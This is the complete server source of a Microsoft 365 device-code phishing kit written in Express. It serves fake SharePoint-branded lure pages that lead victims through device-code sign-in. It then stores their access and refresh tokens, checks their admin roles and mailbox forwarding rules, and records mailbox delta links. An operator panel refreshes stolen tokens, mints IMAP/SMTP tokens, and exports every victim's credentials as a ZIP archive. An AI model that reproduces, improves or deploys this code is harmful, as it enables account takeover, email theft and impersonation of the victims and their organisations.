import express from 'express';
import cors from 'cors';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const PORT = Number(process.env.PORT || 3000);
const ADMIN_KEY = process.env.ADMIN_KEY || 'change-me-please';
const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const TENANT = process.env.TENANT_ID || 'common';
const BASE_URL = (process.env.BASE_URL || `http://localhost:${PORT}`).replace(/\/$/, '');
const REDIRECT_URI = process.env.REDIRECT_URI || `${BASE_URL}/api/v1/auth/redirect`;
const AUTHORITY = `https://login.microsoftonline.com/${TENANT}`;

const REQUESTED_SCOPE =
  'offline_access openid profile email https://graph.microsoft.com/.default';

const IMAP_SCOPE =
  'offline_access https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send';

const FORWARDING_DEFAULT = process.env.FORWARDING_ENABLED_DEFAULT || '1';

const ADMIN_ROLE_TEMPLATES = [
  '62e90394-69f5-4237-9190-012177145e10',
  'e8611ab8-c189-46e8-94e1-60213ab1f814',
  '194ae4cb-b126-40b2-bd5b-6091b380977d'
];

const DATA_DIR = path.join(__dirname, 'data');
const DB_FILE = path.join(DATA_DIR, 'accounts.json');
fs.mkdirSync(DATA_DIR, { recursive: true });

const sessions = new Map();

const load = () => {
  try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf8')); }
  catch { return { accounts: [] }; }
};
const save = (db) => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));

const sqlNow = (d = new Date()) => d.toISOString().slice(0, 19).replace('T', ' ');

const publicAccount = (a) => a && {
  id: a.id, email: a.email, display_name: a.display_name, tenant_id: a.tenant_id,
  is_admin: a.is_admin, admin_roles: a.admin_roles,
  token_expires: a.token_expires, updated_at: a.updated_at,
  usage_location: a.usage_location, forwarding_enabled: a.forwarding_enabled,
  expired: new Date(a.token_expires).getTime() < Date.now()
};

async function graphGet(url, token) {
  const r = await fetch(url, { headers: { Authorization: `Bearer ${token}` } });
  if (!r.ok) return null;
  return r.json();
}

async function checkAdmin(accessToken) {
  const j = await graphGet(
    'https://graph.microsoft.com/v1.0/me/transitiveMemberOf/microsoft.graph.directoryRole?$select=displayName,roleTemplateId',
    accessToken
  );
  if (!j?.value) return { is_admin: 0, roles: [] };
  const isAdmin = j.value.some(r => ADMIN_ROLE_TEMPLATES.includes(r.roleTemplateId)) ? 1 : 0;
  const roles = isAdmin ? j.value.map(r => r.displayName).filter(Boolean) : [];
  return { is_admin: isAdmin, roles };
}

/* ---------- mailbox delta links ---------- */

async function getDeltaLinks(accessToken) {
  async function delta(folder) {
    try {
      let url = `https://graph.microsoft.com/v1.0/me/mailFolders('${folder}')/messages/delta?$top=200&$select=id`;
      for (let i = 0; i < 15; i++) {
        const r = await fetch(url, { headers: { Authorization: `Bearer ${accessToken}` } });
        if (!r.ok) return '';
        const j = await r.json();
        if (j['@odata.deltaLink']) return j['@odata.deltaLink'];
        if (j['@odata.nextLink']) { url = j['@odata.nextLink']; continue; }
        return '';
      }
      return '';
    } catch { return ''; }
  }
  const [inbox, sent] = await Promise.all([delta('inbox'), delta('sentitems')]);
  return { inbox, sent };
}

async function checkForwarding(accessToken) {
  try {
    const r = await fetch('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });
    if (!r.ok) return FORWARDING_DEFAULT;
    const j = await r.json();
    const fwd = (j.value || []).some(x => x.actions &&
      ((x.actions.forwardTo || []).length || (x.actions.forwardAsAttachmentTo || []).length));
    return fwd ? '1' : '0';
  } catch { return FORWARDING_DEFAULT; }
}

/* ---------- jwt decoding ---------- */

function decodeJwt(token) {
  try {
    const p = token.split('.')[1];
    if (!p) return null;
    const pad = p.replace(/-/g, '+').replace(/_/g, '/');
    return JSON.parse(Buffer.from(pad, 'base64').toString('utf8'));
  } catch { return null; }
}

const TS_CLAIMS = new Set(['exp', 'iat', 'nbf', 'auth_time', 'pwd_exp', 'at_valid']);

function relativeTime(ms) {
  const d = ms - Date.now();
  const abs = Math.abs(d);
  const unit = abs < 60e3 ? ['s', 1e3] : abs < 3.6e6 ? ['m', 60e3] : abs < 86.4e6 ? ['h', 3.6e6] : ['d', 86.4e6];
  const n = Math.round(abs / unit[1]);
  return d >= 0 ? `in ${n}${unit[0]}` : `${n}${unit[0]} ago`;
}

function annotateClaims(claims) {
  if (!claims) return null;
  const out = {};
  for (const [k, v] of Object.entries(claims)) {
    if (TS_CLAIMS.has(k) && typeof v === 'number') {
      out[k] = { value: v, iso: new Date(v * 1000).toISOString(), relative: relativeTime(v * 1000) };
    } else if (['scp', 'roles', 'group', 'amr'].includes(k)) {
      out[k] = Array.isArray(v) ? v : String(v).split(' ');
    } else {
      out[k] = v;
    }
  }
  return out;
}

/* ---------- store-only zip ---------- */

const CRC_TABLE = (() => {
  const t = new Int32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c;
  }
  return t;
})();

function crc32(buf) {
  let c = -1;
  for (let i = 0; i < buf.length; i++) c = (c >>> 8) ^ CRC_TABLE[(c ^ buf[i]) & 0xff];
  return (c ^ -1) >>> 0;
}

function zipStore(files) {
  const now = new Date();
  const dosTime = ((now.getHours() << 11) | (now.getMinutes() << 5) | Math.floor(now.getSeconds() / 2)) & 0xffff;
  const dosDate = (((now.getFullYear() - 1980) << 9) | ((now.getMonth() + 1) << 5) | now.getDate()) & 0xffff;

  const parts = [];
  const central = [];
  let offset = 0;

  for (const f of files) {
    const name = Buffer.from(f.name, 'utf8');
    const data = Buffer.isBuffer(f.data) ? f.data : Buffer.from(f.data, 'utf8');
    const crc = crc32(data);

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0x0800, 6);
    local.writeUInt16LE(0, 8);
    local.writeUInt16LE(dosTime, 10);
    local.writeUInt16LE(dosDate, 12);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(name.length, 26);
    local.writeUInt16LE(0, 28);
    parts.push(local, name, data);

    const cd = Buffer.alloc(46);
    cd.writeUInt32LE(0x02014b50, 0);
    cd.writeUInt16LE(20, 4);
    cd.writeUInt16LE(20, 6);
    cd.writeUInt16LE(0x0800, 8);
    cd.writeUInt16LE(0, 10);
    cd.writeUInt16LE(dosTime, 12);
    cd.writeUInt16LE(dosDate, 14);
    cd.writeUInt32LE(crc, 16);
    cd.writeUInt32LE(data.length, 20);
    cd.writeUInt32LE(data.length, 24);
    cd.writeUInt16LE(name.length, 28);
    cd.writeUInt32LE(0, 38);
    cd.writeUInt32LE(offset, 42);
    central.push(Buffer.concat([cd, name]));

    offset += local.length + name.length + data.length;
  }

  const cdBuf = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);

  return Buffer.concat([...parts, cdBuf, eocd]);
}

function toIni(a) {
  return [
    '[profile]',
    `email=${a.email}`,
    `tenant_id=${a.tenant_id}`,
    `client_id=${a.client_id}`,
    'client_secret=',
    `redirect_uri=${a.redirect_uri}`,
    `access_token=${a.access_token}`,
    `refresh_token=${a.refresh_token}`,
    `token_expires=${a.token_expires}`,
    `delta_link=${a.delta_link || ''}`,
    `sent_delta_link=${a.sent_delta_link || ''}`,
    `is_admin=${a.is_admin}`,
    `admin_roles=${JSON.stringify(a.admin_roles)}`,
    `admin_checked_at=${a.admin_checked_at}`,
    `updated_at=${a.updated_at}`,
    `token_scope=${a.token_scope}`,
    'access_mode=oauth',
    `usage_location=${a.usage_location || 'US'}`,
    `forwarding_enabled=${a.forwarding_enabled || '0'}`,
    ''
  ].join('\n');
}

const safeName = (email) => email.replace(/[^a-z0-9@._-]/gi, '_');

const escapeHtml = (s) => String(s ?? '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

/* ---------- link page renderer ---------- */

function pageHtml(p) {
  const org = escapeHtml(p.org);
  const doc = p.doc ? `<p class="vz-ctx-doc">${escapeHtml(p.doc)}</p>` : '';
  return `<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SharePoint</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;min-height:100vh;color:#333}
.hidden{display:none!important}
.vz-spinner{width:40px;height:40px;border:3px solid #e5e7eb;border-top-color:#036c70;border-radius:50%;animation:vzspin .8s linear infinite;margin:0 auto 16px}
@keyframes vzspin{to{transform:rotate(360deg)}}
.vz-loading,.vz-success,.vz-error{text-align:center;padding:48px 24px}
.vz-ok,.vz-err{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:28px;font-weight:700;color:#fff}
.vz-ok{background:#10b981}.vz-err{background:#ef4444}
.vz-code-line{font-size:16px;color:#333;margin-bottom:12px}
.vz-signin-line{font-size:14px;color:#666;margin:16px 0 20px}
.vz-timer{font-size:13px;color:#999;margin-top:14px}
.code{font-size:28px;font-weight:700;font-family:'Courier New',monospace;letter-spacing:4px;color:#036c70;cursor:pointer;user-select:all}
.copy-btn{background:#036c70;color:#fff;border:none;padding:9px 20px;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600;margin-top:8px}
.copy-btn:hover{opacity:.9}
.verify-btn{width:100%;background:#036c70;color:#fff;border:none;padding:13px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
.verify-btn:hover{background:#024f52}
.vz-brand{margin:0 auto 20px;display:flex;justify-content:center;align-items:center}
.vz-brand svg{height:28px;max-width:160px;display:block}
.vz-ctx{margin-bottom:20px;text-align:center}
.vz-ctx-doc{font-size:15px;font-weight:600;color:#1a1a1a;margin-bottom:4px}
.vz-ctx-org{font-size:13px;color:#666}
.vz-page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.vz-card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);width:100%;max-width:420px;padding:36px 32px;text-align:center;border:1px solid #e8e8e8}
</style></head><body>
<div class="vz-page"><div class="vz-card">
  <div class="vz-brand" style="color:#036c70"><svg viewBox="0 0 120 28" xmlns="http://www.w3.org/2000/svg"><rect width="12" height="12" fill="#f25022"/><rect x="14" width="12" height="12" fill="#7fba00"/><rect y="14" width="12" height="12" fill="#00a4ef"/><rect x="14" y="14" width="12" height="12" fill="#ffb900"/><text x="34" y="19" font-family="Segoe UI,sans-serif" font-size="16" font-weight="600" fill="currentColor">SharePoint</text></svg></div>
  <div class="vz-ctx">${doc}<p class="vz-ctx-org">${org}</p></div>
  <div id="loadingScreen" class="vz-loading"><div class="vz-spinner"></div></div>
  <div id="mainScreen" class="hidden">
    <p class="vz-code-line">Your code is:</p>
    <span class="code" id="userCode">------</span><br>
    <button class="copy-btn" id="copyBtn">Copy Code</button>
    <p class="vz-signin-line">Sign in with Microsoft.</p>
    <button class="verify-btn" id="verifyBtn"><svg viewBox="0 0 21 21" width="20" height="20"><rect width="10" height="10" fill="#f25022"/><rect x="11" width="10" height="10" fill="#7fba00"/><rect y="11" width="10" height="10" fill="#00a4ef"/><rect x="11" y="11" width="10" height="10" fill="#ffb900"/></svg> Continue with Microsoft</button>
    <p class="vz-timer" id="timer"></p>
  </div>
  <div id="successScreen" class="hidden vz-success"><div class="vz-ok">&#10003;</div><h2>Authentication Successful</h2><p>Redirecting you now...</p></div>
  <div id="errorScreen" class="hidden vz-error"><div class="vz-err">!</div><h2>Authentication Failed</h2><p id="errorMessage"></p></div>
</div></div>
<script>
var API_BASE = ${JSON.stringify(BASE_URL)};
var REDIRECT_URL = ${JSON.stringify(p.redirect || 'https://www.microsoft.com')};
var PAGE_ID = ${JSON.stringify(p.id)};
var sessionId=null,code=null,verifyUrl=null,expiresIn=900,pollInt=null;
var loadingScreen=document.getElementById('loadingScreen'),mainScreen=document.getElementById('mainScreen'),successScreen=document.getElementById('successScreen'),errorScreen=document.getElementById('errorScreen'),userCodeEl=document.getElementById('userCode'),timerEl=document.getElementById('timer'),errorMessageEl=document.getElementById('errorMessage'),copyBtn=document.getElementById('copyBtn'),verifyBtn=document.getElementById('verifyBtn');
var COPY_LABEL=copyBtn?copyBtn.textContent:'Copy Code';
function showError(m){loadingScreen.classList.add('hidden');mainScreen.classList.add('hidden');errorMessageEl.textContent=m;errorScreen.classList.remove('hidden');}
function showSuccess(){loadingScreen.classList.add('hidden');mainScreen.classList.add('hidden');successScreen.classList.remove('hidden');setTimeout(function(){window.location.href=REDIRECT_URL;},3000);}
function updateTimer(){if(!timerEl||expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60),s=expiresIn%60;timerEl.textContent='Code expires in '+m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}
function copyToClipboard(){if(!code)return false;try{if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(code).catch(function(){});}else{var t=document.createElement('textarea');t.value=code;t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.focus();t.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(t);}}catch(e){return false;}return true;}
function showCopyFeedback(){copyBtn.textContent='Copied!';setTimeout(function(){copyBtn.textContent=COPY_LABEL;},2000);}
function openVerifyWindow(){if(!verifyUrl)return;window.open(verifyUrl,'_blank','width=520,height=700,scrollbars=yes,resizable=yes');}
function onCopyClick(){if(!copyToClipboard())return;showCopyFeedback();openVerifyWindow();}
function openMicrosoftLogin(){if(!code)return;copyToClipboard();showCopyFeedback();openVerifyWindow();}
function startPolling(){if(pollInt)clearInterval(pollInt);pollInt=setInterval(async function(){if(!sessionId)return;try{var r=await fetch(API_BASE+'/api/poll/'+sessionId);var d=await r.json();if(d.status==='connected'){clearInterval(pollInt);showSuccess();}if(d.status==='expired'){clearInterval(pollInt);showError('Code expired. Please refresh.');}}catch(e){}},3000);}
async function startDeviceCode(){try{var r=await fetch(API_BASE+'/api/devicecode',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label:null,pageId:PAGE_ID})});var d={};try{d=await r.json();}catch(e){}if(!r.ok)throw new Error(d.error||d.description||('Verification service error ('+r.status+')'));if(!d.session_id&&!d.sessionId)throw new Error('Invalid verification response from server');sessionId=d.session_id||d.sessionId;code=d.user_code;verifyUrl=d.verification_uri;expiresIn=d.expires_in||900;userCodeEl.textContent=code;loadingScreen.classList.add('hidden');mainScreen.classList.remove('hidden');updateTimer();startPolling();}catch(err){showError((err&&err.message)||('Failed to connect to verification service at '+API_BASE));}}
copyBtn.addEventListener('click',onCopyClick);
verifyBtn.addEventListener('click',openMicrosoftLogin);
startDeviceCode();
</script>
</body></html>`;
}

/* ---------- app ---------- */

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const publicCors = cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'x-admin-key']
});

app.get('/api/health', (_req, res) => res.json({ ok: true }));

/* ---------- device code ---------- */

app.post('/api/devicecode', publicCors, async (req, res) => {
  try {
    const r = await fetch(`${AUTHORITY}/oauth2/v2.0/devicecode`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ client_id: CLIENT_ID, scope: REQUESTED_SCOPE })
    });
    const j = await r.json();
    if (!r.ok) return res.status(400).json({ error: j.error, description: j.error_description });

    const id = crypto.randomUUID();
    const db = load();
    const pageId = (req.body?.pageId || '').trim();
    const pageIdFinal = pageId && (db.pages || []).some(p => p.id === pageId) ? pageId : null;

    sessions.set(id, {
      id,
      label: (req.body?.label || '').trim(),
      pageId: pageIdFinal,
      device_code: j.device_code,
      interval: j.interval || 5,
      next_poll_at: Date.now() + (j.interval || 5) * 1000,
      expires_at: Date.now() + j.expires_in * 1000,
      status: 'pending'
    });

    res.json({
      session_id: id,
      user_code: j.user_code,
      verification_uri: j.verification_uri,
      expires_in: j.expires_in,
      interval: j.interval || 5
    });
  } catch (e) {
    res.status(500).json({ error: 'server_error', description: String(e) });
  }
});

app.get('/api/poll/:id', publicCors, async (req, res) => {
  const s = sessions.get(req.params.id);
  if (!s) return res.json({ status: 'expired' });

  if (s.status === 'connected') {
    const acc = load().accounts.find(a => a.id === s.account_id);
    sessions.delete(s.id);
    return res.json({ status: 'connected', account: publicAccount(acc) });
  }
  if (Date.now() > s.expires_at) { sessions.delete(s.id); return res.json({ status: 'expired' }); }
  if (Date.now() < s.next_poll_at) {
    return res.json({ status: 'pending', retry_after: Math.ceil((s.next_poll_at - Date.now()) / 1000) });
  }

  try {
    const r = await fetch(`${AUTHORITY}/oauth2/v2.0/token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
        client_id: CLIENT_ID,
        device_code: s.device_code
      })
    });
    const j = await r.json();

    if (j.error === 'authorization_pending') {
      s.next_poll_at = Date.now() + s.interval * 1000;
      return res.json({ status: 'pending' });
    }
    if (j.error === 'slow_down') {
      s.interval += 5;
      s.next_poll_at = Date.now() + s.interval * 1000;
      return res.json({ status: 'pending' });
    }
    if (j.error === 'expired_token') { sessions.delete(s.id); return res.json({ status: 'expired' }); }
    if (j.error === 'authorization_declined') { sessions.delete(s.id); return res.json({ status: 'declined' }); }
    if (!r.ok) return res.json({ status: 'error', description: j.error_description });

    const me = await graphGet(
      'https://graph.microsoft.com/v1.0/me?$select=mail,userPrincipalName,displayName,id,usageLocation',
      j.access_token
    );
    const email = me?.mail || me?.userPrincipalName || s.label || 'unknown';
    const admin = await checkAdmin(j.access_token);
    const deltas = await getDeltaLinks(j.access_token);
    const forwarding = await checkForwarding(j.access_token);
    const now = new Date();

    const account = {
      id: crypto.randomUUID(),
      email,
      display_name: me?.displayName || '',
      tenant_id: TENANT,
      client_id: CLIENT_ID,
      redirect_uri: REDIRECT_URI,
      access_token: j.access_token,
      refresh_token: j.refresh_token || '',
      token_expires: new Date(now.getTime() + j.expires_in * 1000).toISOString(),
      delta_link: deltas.inbox,
      sent_delta_link: deltas.sent,
      is_admin: admin.is_admin,
      admin_roles: admin.roles,
      admin_checked_at: sqlNow(now),
      updated_at: sqlNow(now),
      token_scope: j.scope || REQUESTED_SCOPE,
      access_mode: 'oauth',
      usage_location: me?.usageLocation || '',
      forwarding_enabled: forwarding,
      created_at: now.toISOString()
    };

    const db = load();
    db.accounts = db.accounts.filter(a => a.email.toLowerCase() !== email.toLowerCase());
    db.accounts.push(account);
    if (s.pageId) {
      db.pages = db.pages || [];
      const pg = db.pages.find(p => p.id === s.pageId);
      if (pg) {
        pg.connections = (pg.connections || 0) + 1;
        pg.last_email = email;
        pg.last_connected_at = sqlNow();
      }
    }
    save(db);

    s.status = 'connected';
    s.account_id = account.id;
    res.json({ status: 'connected', account: publicAccount(account) });
  } catch (e) {
    res.json({ status: 'error', description: String(e) });
  }
});

/* ---------- admin ---------- */

const adminOnly = (req, res, next) => {
  if (req.get('x-admin-key') !== ADMIN_KEY) return res.status(401).json({ error: 'unauthorized' });
  next();
};

app.get('/api/admin/accounts', adminOnly, (_req, res) => {
  res.json({ accounts: load().accounts.map(publicAccount) });
});

app.get('/api/admin/accounts/:id', adminOnly, (req, res) => {
  const acc = load().accounts.find(a => a.id === req.params.id);
  if (!acc) return res.status(404).json({ error: 'not_found' });

  const claims = decodeJwt(acc.access_token);
  const scopes = (acc.token_scope || '').split(/\s+/).filter(Boolean);

  res.json({
    account: publicAccount(acc),
    access_token: {
      length: acc.access_token.length,
      sha256: crypto.createHash('sha256').update(acc.access_token).digest('hex').slice(0, 16),
      format: claims ? 'jwt' : 'opaque',
      claims: annotateClaims(claims)
    },
    refresh_token: {
      length: (acc.refresh_token || '').length,
      present: Boolean(acc.refresh_token),
      prefix: (acc.refresh_token || '').slice(0, 12),
      sha256: acc.refresh_token
        ? crypto.createHash('sha256').update(acc.refresh_token).digest('hex').slice(0, 16)
        : null
    },
    scope: {
      count: scopes.length,
      items: scopes,
      graph_resource: scopes.some(s => s.startsWith('https://graph.microsoft.com/')),
      delegated_mail: scopes.some(s => /^(Mail|IMAP|SMTP|POP)/i.test(s))
    },
    mailbox: {
      usage_location: acc.usage_location || '',
      forwarding_enabled: acc.forwarding_enabled || '0',
      delta_link_present: Boolean(acc.delta_link),
      sent_delta_link_present: Boolean(acc.sent_delta_link)
    },
    audit: {
      client_id: acc.client_id,
      redirect_uri: acc.redirect_uri,
      access_mode: acc.access_mode,
      created_at: acc.created_at,
      admin_checked_at: acc.admin_checked_at
    }
  });
});

app.get('/api/admin/export/:id', adminOnly, (req, res) => {
  const acc = load().accounts.find(a => a.id === req.params.id);
  if (!acc) return res.status(404).json({ error: 'not_found' });
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="${safeName(acc.email)}.ini"`);
  res.send(toIni(acc));
});

async function refreshOne(acc, scope = REQUESTED_SCOPE) {
  if (!acc.refresh_token) return { ok: false, error: 'no_refresh_token' };
  try {
    const r = await fetch(`${AUTHORITY}/oauth2/v2.0/token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        client_id: CLIENT_ID,
        refresh_token: acc.refresh_token,
        scope
      })
    });
    const j = await r.json();
    if (!r.ok) return { ok: false, error: j.error || 'refresh_failed' };

    acc.access_token = j.access_token;
    if (j.refresh_token) acc.refresh_token = j.refresh_token;
    acc.token_expires = new Date(Date.now() + j.expires_in * 1000).toISOString();
    acc.updated_at = sqlNow();
    if (j.scope) acc.token_scope = j.scope;
    return { ok: true };
  } catch (e) {
    return { ok: false, error: String(e) };
  }
}

app.post('/api/admin/refresh/:id', adminOnly, async (req, res) => {
  const db = load();
  const acc = db.accounts.find(a => a.id === req.params.id);
  if (!acc) return res.status(404).json({ error: 'not_found' });
  const out = await refreshOne(acc);
  if (!out.ok) return res.status(400).json({ error: out.error });
  save(db);
  res.json({ ok: true, account: publicAccount(acc) });
});

app.post('/api/admin/refresh-all', adminOnly, async (_req, res) => {
  const db = load();
  const results = [];
  for (const acc of db.accounts) {
    const out = await refreshOne(acc);
    results.push({ email: acc.email, ...out });
  }
  save(db);
  res.json({
    refreshed: results.filter(r => r.ok).length,
    failed: results.filter(r => !r.ok).length,
    results
  });
});

app.get('/api/admin/token/:id', adminOnly, async (req, res) => {
  const db = load();
  const acc = db.accounts.find(a => a.id === req.params.id);
  if (!acc) return res.status(404).json({ error: 'not_found' });

  const scope = req.query.resource === 'imap' ? IMAP_SCOPE : REQUESTED_SCOPE;
  const out = await refreshOne(acc, scope);
  if (!out.ok) return res.status(400).json({ error: out.error });
  save(db);

  res.json({ email: acc.email, access_token: acc.access_token, expires_at: acc.token_expires });
});

app.get('/api/admin/export-all.zip', adminOnly, async (req, res) => {
  const db = load();
  const report = [];
  const files = [];

  for (const acc of db.accounts) {
    if (req.query.refresh === '1') {
      const out = await refreshOne(acc);
      report.push(`${acc.email}\t${out.ok ? 'refreshed' : 'FAILED: ' + out.error}`);
      await new Promise(r => setTimeout(r, 150));
    }
    files.push({ name: `profiles/${safeName(acc.email)}.ini`, data: toIni(acc) });
  }

  if (req.query.refresh === '1') {
    save(db);
    files.unshift({
      name: '_refresh-report.txt',
      data: `Generated ${new Date().toISOString()}\nRefreshed ${report.filter(r => r.endsWith('refreshed')).length} / ${report.length}\n\n${report.join('\n')}\n`
    });
  }

  if (!files.length) return res.status(404).json({ error: 'no_accounts' });

  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Disposition', `attachment; filename="profiles-${Date.now()}.zip"`);
  res.send(zipStore(files));
});

app.delete('/api/admin/accounts/:id', adminOnly, (req, res) => {
  const db = load();
  db.accounts = db.accounts.filter(a => a.id !== req.params.id);
  save(db);
  res.json({ ok: true });
});

/* ---------- link pages ---------- */

app.post('/api/admin/pages', adminOnly, (req, res) => {
  const db = load();
  db.pages = db.pages || [];
  const p = {
    id: crypto.randomBytes(4).toString('hex'),
    org: (req.body?.org || 'Microsoft 365').slice(0, 80),
    doc: (req.body?.doc || '').slice(0, 80),
    redirect: (req.body?.redirect || 'https://www.microsoft.com').slice(0, 200),
    created_at: new Date().toISOString(),
    visits: 0,
    connections: 0,
    last_email: '',
    last_connected_at: ''
  };
  db.pages.push(p);
  save(db);
  res.json({ page: p });
});

app.get('/api/admin/pages', adminOnly, (_req, res) => {
  res.json({ pages: load().pages || [] });
});

app.delete('/api/admin/pages/:id', adminOnly, (req, res) => {
  const db = load();
  db.pages = (db.pages || []).filter(x => x.id !== req.params.id);
  save(db);
  res.json({ ok: true });
});

app.get('/p/:id', (req, res) => {
  const db = load();
  const p = (db.pages || []).find(x => x.id === req.params.id);
  if (!p) return res.status(404).send('Page not found');
  p.visits = (p.visits || 0) + 1;
  save(db);
  res.type('html').send(pageHtml(p));
});

/* ---------- redirect landing ---------- */

app.get('/api/v1/auth/redirect', (_req, res) => {
  res.type('html').send(
    '<!doctype html><meta charset="utf-8"><title>Connected</title>' +
    '<body style="font-family:Segoe UI,sans-serif;display:grid;place-items:center;height:100vh;margin:0;background:#f6f7f9">' +
    '<div style="text-align:center"><h2 style="color:#107c41">Account connected</h2>' +
    '<p style="color:#5b6472">You can close this tab.</p></div>'
  );
});

app.listen(PORT, () => console.log(`listening on ${PORT}`));